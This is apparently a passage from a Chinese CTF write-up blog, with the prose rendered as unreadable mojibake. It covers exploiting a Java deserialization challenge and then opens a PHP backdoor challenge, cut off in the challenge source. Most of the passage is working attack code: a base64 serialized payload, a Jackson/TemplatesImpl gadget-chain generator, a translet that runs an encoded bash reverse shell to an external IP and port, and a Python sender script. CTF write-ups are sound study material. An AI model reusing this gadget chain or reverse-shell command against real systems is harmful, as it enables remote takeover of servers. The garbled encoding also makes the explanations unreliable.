class="string">&quot;rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAKHQAA2V4cHQACGV4cC5qYXZhdAAEbWFpbnNyACZqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlTGlzdPwPJTG17I4QAgABTAAEbGlzdHEAfgAHeHIALGphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVDb2xsZWN0aW9uGUIAgMte9x4CAAFMAAFjdAAWTGphdmEvdXRpbC9Db2xsZWN0aW9uO3hwc3IAE2phdmEudXRpbC5BcnJheUxpc3R4gdIdmcdhnQMAAUkABHNpemV4cAAAAAB3BAAAAAB4cQB+ABV4c3IALGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLlBPSk9Ob2RlAAAAAAAAAAICAAFMAAZfdmFsdWVxAH4AAXhyAC1jb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5WYWx1ZU5vZGUAAAAAAAAAAQIAAHhyADBjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5CYXNlSnNvbk5vZGUAAAAAAAAAAQIAAHhwc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAFTAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAXVyAAJbQqzzF/gGCFTgAgAAeHAAAAYOyv66vgAAADQANQoACAAlCgAmACcIACgKACYAKQcAKgoABQArBwAsBwAtAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAlMZXZpbHJlZjsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALgEAEE1ldGhvZFBhcmFtZXRlcnMBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ+AQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHACoBAApTb3VyY2VGaWxlAQAMZXZpbHJlZi5qYXZhDAAJAAoHAC8MADAAMQEABGNhbGMMADIAMwEAE2phdmEvaW8vSU9FeGNlcHRpb24MADQACgEAB2V2aWxyZWYBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAAAAIADAAAAAYAAQAAAAkADQAAAAwAAQAAAAUADgAPAAAAAQAQABEAAwALAAAAPwAAAAMAAAABsQAAAAIADAAAAAYAAQAAABYADQAAACAAAwAAAAEADgAPAAAAAAABABIAEwABAAAAAQAUABUAAgAWAAAABAABABcAGAAAAAkCABIAAAAUAAAAAQAQABkAAwALAAAASQAAAAQAAAABsQAAAAIADAAAAAYAAQAAABsADQAAACoABAAAAAEADgAPAAAAAAABABIAEwABAAAAAQAaABsAAgAAAAEAHAAdAAMAFgAAAAQAAQAXABgAAAANAwASAAAAGgAAABwAAAAIAB4ACgABAAsAAABhAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAMADAAAABYABQAAAA0ACQAQAAwADgANAA8AEQARAA0AAAAMAAEADQAEAB8AIAAAACEAAAAHAAJMBwAiBAABACMAAAACACRwdAAHc2hhbmdoZXB3AQB4&quot;</span></span><br><span class="line">res =requests.post(url=url,data=string)</span><br><span class="line"></span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><h2 id="å‘ç‚¹"><span id="å‘ç‚¹"> å‘ç‚¹</span></h2><p>å‚è€ƒï¼š<a href="https://boogipop.com/2023/04/24/AliyunCTF%202023%20WriteUP/">https://boogipop.com/2023/04/24/AliyunCTF%202023%20WriteUP/</a><br>æˆ‘ä¹Ÿç®—æ˜¯æ¯”è¾ƒç«æ˜Ÿäº†ï¼Œè¿™ä¸ªå‘ç‚¹åœ¨aliyunçš„æ—¶å€™å°±å·²ç»æœ‰å¸ˆå‚…ä½œäº†åˆ†æï¼Œä½†æ˜¯é‚£æ—¶å€™æˆ‘è¿˜ä¸ä¼šjavaï¼Œå‹æ ¹åšä¸åŠ¨ä¸€é“é¢˜ï¼Œæ”¾å¼ƒäº†ï¼Œç»“æœè¿™æ¬¡å‡ºç°äº†ï¼Œç®—äº†ï¼Œè¶è¿™æ¬¡è§£å†³ä¸€ä¸‹å§ã€‚</p><p>å°±æ˜¯å¦‚æœç›´æ¥ç”¨é¢˜ç›®çš„åŒ…çš„è¯ï¼Œä¸€å®šä¼šæ— æ³•åºåˆ—åŒ–ï¼Œä¼šæŠ¥é”™ã€‚<br>ä¼šæŒ‡å‡ºç©ºæŒ‡é’ˆé”™è¯¯ï¼ŒåŸå› å°±åœ¨writeReplaceè¿™é‡Œï¼Œåºåˆ—åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨çˆ¶ç±»writeReplaceæ–¹æ³•ï¼Œè€Œæ²¡æœ‰æ­£å¸¸å»åºåˆ—åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Object <span class="title function_">writeReplace</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> NodeSerialization.from(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥è¦åˆ æ‰è¿™ä¸ªæ–¹æ³•ï¼Œç”±äºæ”¹jaråŒ…è¿‡äºéº»çƒ¦ï¼Œ<br>æˆ‘ä»¬ç›´æ¥åœ¨æœ¬åœ°èµ·ä¸ªä¸€æ¨¡ä¸€æ ·çš„ç±»ï¼Œ<br>åˆ›ä¸ªä¸€æ ·çš„åŒ…ï¼Œå°†ç±»çš„å†…å®¹å…¨éƒ¨å¤åˆ¶è¿‡æ¥ï¼Œç„¶åæŠŠè¿™ä¸ªæ–¹æ³•åˆ å»ï¼Œå°±å¯ä»¥æ­£å¸¸åºåˆ—åŒ–äº†ã€‚</p><h2 id="aliyunbapassit"><span id="aliyunbapassit"> aliyunbapassit</span></h2><p>ç›´æ¥æ‹¿ä¸Šé¢çš„payloadæ‰“ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.BaseJsonNode;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(evilref.class.getName());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        CtClass superClass = classPool.get(AbstractTranslet.class.getName());</span></span><br><span class="line"><span class="comment">//        ctClass.setSuperclass(superClass);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;,ctClass);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        constructor.setBody(&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        ctClass.addConstructor(constructor);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = ctClass.toBytecode();</span><br><span class="line">        <span class="comment">//byte[][] codes = new byte[][]&#123;code&#125;;</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        ref(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        ref(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;shanghe&quot;</span>);</span><br><span class="line">        ref(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line"></span><br><span class="line">        serialize_func.serialize(exp);</span><br><span class="line">        WriteToFileExample(serialize_func.encryptToBase64(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">WriteToFileExample</span><span class="params">(String args)</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="string">&quot;è¿™æ˜¯è¦å†™å…¥æ–‡ä»¶çš„å­—ç¬¦ä¸²å†…å®¹&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">BufferedWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;output.txt&quot;</span>));</span><br><span class="line">                writer.write(args);</span><br><span class="line">                writer.close();</span><br><span class="line">                System.out.println(<span class="string">&quot;å­—ç¬¦ä¸²å·²æˆåŠŸå†™å…¥æ–‡ä»¶ã€‚&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;å†™å…¥æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ï¼š&quot;</span> + e.getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ref</span><span class="params">(Object obj,String field,Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">reffield</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        reffield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        reffield.set(obj,value);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line"></span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‘½ä»¤æ‰§è¡Œæ”¹æˆåå¼¹shellå°±è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evilref</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xNDMuMTkyLjE5LzExNDUgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæ ¹æ®é¢˜ç›®è·¯ç”±</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.ctf.bypassit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">IndexController</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/bypassit&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">bypassIt</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(request.getInputStream());</span><br><span class="line">            ois.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">            var3.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;bypass it and rce it&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç›´æ¥å†™ä¸ªpythonè„šæœ¬ï¼ŒæŠŠåºåˆ—åŒ–çš„å†…å®¹ä¼ è¿‡å»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="type">requests</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">url</span> <span class="operator">=</span><span class="string">&quot;http://localhost:8080/bypassit&quot;</span></span><br><span class="line"></span><br><span class="line">with <span class="title function_">open</span><span class="params">(<span class="string">&#x27;ser.bin&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span> as file:</span><br><span class="line">    file_content = <span class="type">file</span></span><br><span class="line">    <span class="variable">res</span> <span class="operator">=</span> requests.post(url=url, data=file_content)</span><br><span class="line">    print(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åºåˆ—åŒ–åå†…å®¹å†™åˆ°äº†ser.binï¼Œå¤åˆ¶åˆ°pythonè·¯å¾„ä¸‹ï¼Œç®€å•ä½¿ç”¨pythonã€‚<br>æœ¬åœ°dockerfileå¤ç°çš„ï¼Œä¸è¿‡åŸºæœ¬å°±æ˜¯æ‰“å‡ºæ¥äº†ã€‚<br>eeeeeeeeeeez~<br>pythonçœŸæ˜¯å¤ªå¥½ç”¨äº†ï¼Œå¯¹äºæˆ‘è¿™ä¸ªç”¨ä¸æ¥burpå®Œæˆå¤æ‚è¯·æ±‚çš„ï¼Œpythonå°±æ˜¯ç¦éŸ³ï¼ï¼<br>{â€œâ€:true,â€œbase64Codeâ€:â€œaaaâ€}  base64ç»•è¿‡jsoninjectã€‚</p><h1 id="fumo_backdoor"><span id="fumo_backdoor"> FUMO_backdoor</span></h1><p>åº·åº·nu1lï¼š<a href="https://github.com/AFKL-CUIT/CTF-Challenges/blob/master/CISCN/2022/backdoor/writup/writup.md">https://github.com/AFKL-CUIT/CTF-Challenges/blob/master/CISCN/2022/backdoor/writup/writup.md</a><br>å…ˆæ¥ä¸€æ³¢æºç é‰´èµï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">error_reporting</span><span class="params">(<span class="number">0</span>)</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, __DIR__.<span class="string">&quot;:/tmp&quot;</span>);</span><br><span class="line">define(<span class="string">&quot;FUNC_LIST&quot;</span>, get_defined_functions());</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">fumo_backdoor</span> &#123;</span><br><span class="line">    <span class="type">public</span> <span class="variable">$path</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">public</span> <span class="variable">$argv</span> <span 